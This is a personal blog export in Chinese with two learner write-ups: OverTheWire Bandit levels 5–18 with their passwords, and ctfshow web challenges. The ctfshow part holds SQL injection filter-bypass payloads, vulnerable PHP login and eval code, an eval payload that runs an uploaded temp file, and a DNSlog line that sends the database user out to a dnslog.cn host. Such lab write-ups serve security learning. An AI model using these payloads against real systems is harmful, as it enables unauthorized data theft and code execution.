<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513214557871.png" alt="image-20230513214557871"></p>
<p>2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe</p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>在inhere目录下，只有一个唯一可读的文件</p>
<p>由于文件名都有规律，且有特殊符号，于是我用了 cat .&#x2F;-file0{0,1,2…9}的方法，也就是在末尾3个之间，再cat .&#x2F;-file07试试，有了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221122380.png" alt="image-20230513221122380"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221420135.png" alt="image-20230513221420135"></p>
<p>lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR</p>
<p>正解操作是：</p>
<p>file .&#x2F;-file* 查看文件类型</p>
<p>cat .&#x2F;-file07</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>密码存储文件在inhere目录下，且可读、1033bytes、不可执行</p>
<p>inhere目录下有将近20个目录，一个个来不太现实，用到du命令</p>
<p>du : 显示每个文件和目录的磁盘使用空间~~~文件的大小。</p>
<p>命令参数：</p>
<p>-a   #显示目录中文件的大小  单位 KB 。</p>
<p>-b  #显示目录中文件的大小，以字节byte为单位。</p>
<p>-c  #显示目录中文件的大小，同时也显示总和；单位KB。</p>
<p>-k 、 -m  #显示目录中文件的大小，-k 单位KB，-m 单位MB.</p>
<p>-s  #仅显示目录的总值，单位KB。</p>
<p>-h  #以K  M  G为单位显示，提高可读性~~~（最常用的一个~也可能只用这一个就满足需求了）<br><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223236240.png" alt="image-20230513223236240"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223206962.png" alt="image-20230513223206962"></p>
<p>du -a -b</p>
<p>cat .&#x2F;maybehere07&#x2F;.file2</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223351281.png" alt="image-20230513223351281"></p>
<p>P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>被存在服务器的某处，由用户bandit7所有，bandit6组所有，33bytes</p>
<p>find基本用法：find [PATH] [option] [action]  </p>
<p>-user name : 列出文件所有者为name的文件<br>        -group name : 列出文件所属用户组为name的文件<br>        -uid n : 列出文件所有者为用户ID为n的文件<br>        -gid n : 列出文件所属用户组为用户组ID为n的文件  </p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112457648.png" alt="image-20230514112457648"></p>
<p>可以使用 <strong>2&gt;&#x2F;dev&#x2F;null</strong> 将错误信息重定向</p>
<p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112752119.png" alt="image-20230514112752119"></p>
<p>参考<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>在data.txt文件中内容为<strong>millionth</strong>的那一行中</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514114655477.png" alt="image-20230514114655477"></p>
<p>TESKZC0XvTetK0S9xNwm25STk5iWrBvP</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>在data.txt中，仅出现一次的行文本中</p>
<p>sort与uniq命令</p>
<p>sort排序，</p>
<p>uniq是去掉相邻的重复行，-c统计次数，-u显示不重复的行</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115858357.png" alt="image-20230514115858357"></p>
<p>-c找出现次数为1的即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115916436.png" alt="image-20230514115916436"></p>
<p>参考：<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>在data.txt文件中的少数几个人类可读的字符串中，前面有几个&#x3D;符号</p>
<p>一般查看有乱码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121138624.png" alt="image-20230514121138624"></p>
<p><code>用strings data.txt</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121241304.png" alt="image-20230514121241304"></p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>data.txt文件中，但是包含base64编码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121610805.png" alt="image-20230514121610805"></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>data.txt文件中，但是rot13加密</p>
<p>tr命令：对输入字符进行替换、压缩和删除</p>
<p>将所有的字符向后移动13位,但要保持大写和小写</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122106548.png" alt="image-20230514122106548"></p>
<p>参考：[使用ROT13加密解密_tr解rot13_apersonlikep的博客-CSDN博客](<a href="https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request_id%22:%22168403789316800182732613%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168403789316800182732613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request%5Fid%22%3A%22168403789316800182732613%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168403789316800182732613&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> rot13&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>是data.txt文件，但是反复压缩，十六进制转储。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122659959.png" alt="image-20230514122659959"></p>
<p>xxd命令：转二级制、十六进制</p>
<p>mv命令：重命名</p>
<p>gzip&#x2F;bzip2 -d&#x2F;tar -xvf命令：解压缩</p>
<p>先转二级制</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123813942.png" alt="image-20230514123813942"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123825354.png" alt="image-20230514123825354"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123946806.png" alt="image-20230514123946806"></p>
<p>重命名bz2、解压</p>
<p><img src="/image-20230514124152671.png" alt="image-20230514124152671"></p>
<p>重命名gz、解压</p>
<p><img src="/image-20230514124254797.png" alt="image-20230514124254797"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124423926.png" alt="image-20230514124423926"></p>
<p><img src="/image-20230514124556058.png" alt="image-20230514124556058"></p>
<p>重命名bz2，解压</p>
<p><img src="/image-20230514124733776.png" alt="image-20230514124733776"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124850246.png" alt="image-20230514124850246"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514124956549.png" alt="image-20230514124956549"></p>
<h2 id="ssh、telnet、nc、openssl、nmap工具篇"><a href="#ssh、telnet、nc、openssl、nmap工具篇" class="headerlink" title="ssh、telnet、nc、openssl、nmap工具篇"></a>ssh、telnet、nc、openssl、nmap工具篇</h2><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>在**&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14**中，且只能由bandit14用户读取。且提供了一个私有SSH密钥。</p>
<!--ssh -i 秘钥文件名称 root@远程IP地址-->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514130400052.png" alt="image-20230514130400052"></p>
<p>报错了，看不懂，但是看到绿字说22端口登录是不支持的，于是换个端口。</p>
<p>加了个-p 2220，虽然也报错，但还是提示连到了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132248403.png" alt="image-20230514132248403"></p>
<p>查看即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132359501.png" alt="image-20230514132359501"></p>
<p>fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>连接到本机，且端口为30000提交密码</p>
<p>telnet ip地址 端口</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133034901.png" alt="image-20230514133034901"></p>
<p>jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt</p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>在localhost，端口为30001处提交上关密码，且有ssl加密</p>
<p>openssl：多用途、跨平台密码工具</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133923601.png" alt="image-20230514133923601"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133934323.png" alt="image-20230514133934323"></p>
<p>JQttfApK4SeyHwDlI9SXGR50qclOAil1</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>目的是获取证书，将上一级的密码发送至端口范围为31000到32000的localhost上。1.找出有哪些端口是服务器监听着的；2.找出哪些是使用SSL的；3.只有一个服务器是会给你下一级证书的，其它的只会重复你发给它的。</p>
<p>知识点：端口扫描</p>
<p><code>nmap localhost -p310000-320000</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515113201632.png" alt="image-20230515113201632"></p>
<p><code>openssl s_client -connect localhost:port</code>对上述端口依次尝试，并提交密码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114635689.png" alt="image-20230515114635689"></p>
<p>port为31790时</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114912840.png" alt="image-20230515114912840"></p>
<p>可以知道，又是私钥登陆，与ssh -i有关</p>
<p>存放该私钥。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120130800.png" alt="image-20230515120130800"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120139520.png" alt="image-20230515120139520"></p>
<p><code>ssh -i /tmp/my111/key bandit17@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120357068.png" alt="image-20230515120357068"></p>
<p>要设定权限，700，即只有拥有者可以读写。</p>
<p><code>chmod 700 /tmp/my111/key</code></p>
<p><img src="/../../../Typora/img111/image-20230515120619059.png" alt="image-20230515120619059"></p>
<p>成功登入。</p>
<h2 id="level-17-gt-18"><a href="#level-17-gt-18" class="headerlink" title="level 17-&gt;18"></a>level 17-&gt;18</h2><p>在主目录有两文件<strong>passwords.old and passwords.new</strong>. </p>
<p>下一级的密码在 <strong>passwords.new</strong>里，并且这个old和new只有一行改动了的。</p>
<p>​		注意：当登入bandit18时看到”Byebye!”，这和bandit19有关。</p>
<p>diff命令，比较文件不同。</p>
<ul>
<li><p>“|”表示前后2个文件内容有不同</p>
</li>
<li><p>“&lt;”表示后面文件比前面文件少了1行内容</p>
</li>
<li><p>“&gt;”表示后面文件比前面文件多了1行内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130247402.png" alt="image-20230515130247402"></p>
</li>
</ul>
<p>hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg</p>
<p>exit -&gt;r</p>
<p>登入bandit18，输入密码出现：<img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130727349.png" alt="image-20230515130727349"></p>
<h2 id="level-18-gt-19"><a href="#level-18-gt-19" class="headerlink" title="level 18-&gt;19"></a>level 18-&gt;19</h2><p>下一级密码在主目录的readme中，但是嘞，有人修改了.bashrc，使得在使用SSH登录时注销。</p>
<p>考察点：ssh登陆后可以跟命令执行</p>
<p>所以在bandit17时采用远程登录。</p>
<p><code>ssh bandit18@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515133004926.png" alt="image-20230515133004926"></p>
<p>上图中，rm和chmod也是不允许的操作，查找其他博主的wp，在后面加了“cat  readme”但没效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515145336983-1684133695637-1.png"></p>
<p>止步于此，没权限，不搞了。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ssh</tag>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2023/06/28/ctfshow/</url>
    <content><![CDATA[<h1 id="1-登录框"><a href="#1-登录框" class="headerlink" title="1.登录框"></a>1.登录框</h1><h2 id="1-web6"><a href="#1-web6" class="headerlink" title="1.web6"></a>1.web6</h2><p><code>常见的&#39; or 1=1#</code>会被检测到</p>
<p>遍历了一下万能密码库，发现</p>
<p><code>&#39;or&#39;&#39;=&#39;&#39;or&#39;&#39;=&#39;</code>是可以的</p>
<p>其实经过尝试方法，<strong>过滤了or+空格的形式</strong></p>
<p>那么可以尝试or+tab 或者or%2b</p>
<p>空格绕过:</p>
<blockquote>
<p>&#x2F;**&#x2F;</p>
<p>%a0</p>
<p>tab键</p>
<p>%09</p>
</blockquote>
<p><code>&#39;or%2b1=1#</code></p>
<p><code>&#39;or%091=1%09union%09select%091,2,3#</code>或者将%09的位置全换成tab也是可以的</p>
<blockquote>
<p>  欢迎你，ctfshow欢迎你，2    &lt;form method&#x3D;”post”&gt;</p>
<p>换成version()就是</p>
<p>​    欢迎你，ctfshow欢迎你，10.3.18-MariaDB    &lt;form method&#x3D;”post”&gt;</p>
</blockquote>
<p>为什么<code>&#39;or%2b1=1%2bunion%2bselect%2b%2b1,2,3#</code>不起作用</p>
<p><strong>爆表</strong></p>
<p><code>&#39;or%091=1%09union%09select%091,(select%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),3#</code></p>
<blockquote>
<p>   欢迎你，ctfshow欢迎你，flag,user    &lt;form method&#x3D;”post”&gt;</p>
</blockquote>
<p><strong>爆列</strong></p>
<p><code>&#39;or%091=1%09union%09select%091,(select%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_name=&#39;flag&#39;),3#</code></p>
<blockquote>
<p>flag</p>
</blockquote>
<p><strong>爆字段</strong></p>
<p><code>&#39;or%091=1%09union%09select%091,(select%09group_concat(flag)%09from%09web2.flag),3#</code></p>
<h1 id="版本控制泄露"><a href="#版本控制泄露" class="headerlink" title="版本控制泄露"></a>版本控制泄露</h1><p>版本控制系统，就是记录用户的每一次编辑记录，便于用户回溯。</p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="1-web7"><a href="#1-web7" class="headerlink" title="1.web7"></a>1.web7</h2><p>1’%09不正常，但1’%09#正常</p>
<p><code>?id=-1%27%09union%09select%091,2,3#</code>有回显</p>
<blockquote>
<p>version:10.3.18-MariaDB  database:web7</p>
</blockquote>
<p><strong>爆表</strong></p>
<p><code>?id=-1%27%09union%09select%091,(select%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),database()#</code></p>
<blockquote>
<p>flag,page,user</p>
</blockquote>
<p><strong>爆列</strong></p>
<p><code>?id=-1%27%09union%09select%091,(select%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_name=%27flag%27),3#</code></p>
<p>没有回显？</p>
<p>原来如此，单引号过滤了。用双引号括起来”flag”</p>
<p>所以我的那个是<strong>数字型注入</strong></p>
<blockquote>
<p>flag</p>
</blockquote>
<p><strong>爆字段</strong></p>
<p><code>?id=-1%27%09union%09select%091,(select%09group_concat(flag)%09from%09web7.flag),3#</code></p>
<blockquote>
<p>有flag</p>
</blockquote>
<h2 id="2-web8"><a href="#2-web8" class="headerlink" title="2.web8"></a>2.web8</h2><p>过滤了单引号，空格，union，逗号,and等</p>
<blockquote>
<p> &amp;&amp;代替and是没用的</p>
</blockquote>
<p>union用不了那一般就盲注了</p>
<p><code>-1 or true</code></p>
<p><code>?id=-1%09or%09true</code> 三条文本都有</p>
<p><code>?id=-1%09or%09false</code>无回显</p>
<p><strong>那注入点就是数值点注入</strong></p>
<p>盲注一般用脚本</p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1-web9"><a href="#1-web9" class="headerlink" title="1.web9"></a>1.web9</h2><p>url&#x2F;robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: &#x2F;index.phps</p>
</blockquote>
<p>这个文件下载下来，内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>md5($password,true)</p>
<ul>
<li>默认不写为FALSE。32位16进制的字符串</li>
<li>TRUE。16位原始二进制格式的字符串</li>
</ul>
<p>用mysqli_num_rows()函数来判断是否sql语句查询结果有返回值</p>
</blockquote>
<p>由该文件sql语句结构可知，若md5($password,true)内容为 ‘or’ ，使得变成 password&#x3D;‘xxx’or‘xxx’ 的形式</p>
<p> ‘or’  对应的16进制是  276f7227 </p>
<p>找到的password&#x3D;ffifdyop可满足该条件</p>
<h2 id="2-web10"><a href="#2-web10" class="headerlink" title="2.web10"></a>2.web10</h2><p>点击取消按钮，下载代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>mysqli_fetch_assoc() 从结果集中取得一行作为关联数组，也就是说这个函数不能像mysqli_fetch_row那样用索引来取值，只能用字段名字来取，所以<br>while($row &#x3D; mysqli_fetch_assoc($res)){<br>echo $row[‘cid’].’::’.$row[1].’&lt;br&gt;’;<br>} &#x2F;&#x2F;$row[1]这样是取不到值的</p>
</blockquote>
<blockquote>
<p>使用mysqli_query()函数向数据库查询用户提供的用户名和密码，以查找是否有匹配的记录。如果有，则认为用户登录成功，并显示标记（flag）。</p>
</blockquote>
<blockquote>
<p>没遇到过</p>
<p>with rollup 可以对 group by 分组结果再次进行分组,并在最后添加一行数据用于展示结果( 对group by未指定的字段进行求和汇总, 而group by指定的分组字段则用null占位)</p>
<p>我们使用万能用户名 a’&#x2F;**&#x2F;or&#x2F;**&#x2F;true&#x2F;**&#x2F;# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null &#x3D;&#x3D; null), 从而登录成功<br>————————————————<br>版权声明：本文为CSDN博主「士别三日wyx」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/wangyuxiang946/article/details/120118721">https://blog.csdn.net/wangyuxiang946/article/details/120118721</a></p>
</blockquote>
<p><code>a&#39;/**/or/**/true/**/group/**/by/**/password/**/with/**/rollup/**/#</code></p>
<p><img src="/../../../Typora/img111/image-20230627221928690.png"></p>
<h2 id="3-web11"><a href="#3-web11" class="headerlink" title="3.web11"></a>3.web11</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抓包清空cookie，提交空密码。</p>
<h2 id="4-unknow1"><a href="#4-unknow1" class="headerlink" title="4.unknow1"></a>4.unknow1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">          <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">          <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">          </span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">      </span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析一下，preg_match函数，即匹配，如果有字母和数字呢，返回cerror，如果有特殊字符呢，返回serror；否则返回eval函数。eval可以执行代码。</p>
<p><code>可用的有 </code>? &#x2F; + &lt; &gt; &#x3D;&#96;</p>
<p>?代表任意字符</p>
<p>可构造目录tmp&#x2F;phpxxxxx</p>
<p>payload :?&gt;&lt;?&#x3D;`.+&#x2F;??p&#x2F;p?p??????&#96;; </p>
<p>?&gt;&lt;?&#x3D;是php的短标签(&lt;?&#x3D;)和闭合标签(?&gt;)</p>
<p><code>&lt;?= $name ?&gt;</code> &#x3D;类似于echo形式</p>
<p>思路为：只要是php接收到上传的POST请求，就会保存一个临时文件，若这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="1-web12"><a href="#1-web12" class="headerlink" title="1.web12"></a>1.web12</h2><blockquote>
<p>?cmd&#x3D;phpinfo();</p>
</blockquote>
<p>可以看到该文件存在，则命令执行漏洞存在</p>
<blockquote>
<p>glob()函数可以查找文件, 返回一个文件数组, 常配合通配符来遍历目录</p>
</blockquote>
<blockquote>
<p>?cmd&#x3D;print(glob(‘*’));</p>
</blockquote>
<p>显示Array</p>
<p>所以用print_r或者var_dump函数查看</p>
<blockquote>
<p>array(2) { [0]&#x3D;&gt; string(68) “903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php” [1]&#x3D;&gt; string(9) “index.php” }</p>
</blockquote>
<blockquote>
<p>highlight_file()可以使文件内容高亮显示, 常用于读取文件内容</p>
</blockquote>
<p><code>highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</code></p>
<h1 id="Dnslog注入"><a href="#Dnslog注入" class="headerlink" title="Dnslog注入"></a>Dnslog注入</h1><p>(select load_file(concat(‘\\\\‘,(select hex(user())),’.rihjsd.dnslog.cn&#x2F;abc’)))</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
